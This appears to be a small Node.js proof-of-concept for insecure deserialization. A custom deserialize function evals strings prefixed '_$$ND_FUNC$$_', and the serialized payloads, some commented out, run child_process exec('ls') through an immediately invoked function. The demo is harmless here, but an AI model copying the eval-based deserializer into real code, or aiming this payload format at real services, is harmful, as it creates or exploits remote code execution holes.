var exec = require('child_process').exec;
function deserialize(serializedData) {
  var deserializedObj = JSON.parse(serializedData);
  var obj = {};

  for (var key in deserializedObj) {
    if (deserializedObj.hasOwnProperty(key)) {
      var value = deserializedObj[key];
      if (typeof value === 'string' && value.startsWith("_$$ND_FUNC$$_")) {
        var functionString = value.substring("_$$ND_FUNC$$_".length);
        obj[key] = eval('(' + functionString + ')');
      } else {
        obj[key] = value;
      }
    }
  }

  return obj;
}

// var serializedData = '{"test":"_$$ND_FUNC$$_function() {\\n  return \'hi\';\\n}()"}';
// var serializedData = '{"test":"_$$ND_FUNC$$_function() {\\n    exec(\'ls\', function(error, stdout, stderr) {\\n      if (error) {\\n        console.error(\'Error executing command:\', error);\\n        return;\\n      }\\n      console.log(\'Command output:\', stdout);\\n    });\\n  }()"}';
var serializedData =  '{"test":"_$$ND_FUNC$$_function() {\\n    exec(\'ls\', function(error, stdout, stderr) {\\n      if (error) {\\n        // console.error(\'Error executing command:\', error);\\n        return;\\n      }\\n      console.log(\'Command output:\', stdout);\\n    });\\n  }()"}';
var deserializedData = deserialize(serializedData);

console.log(deserializedData);

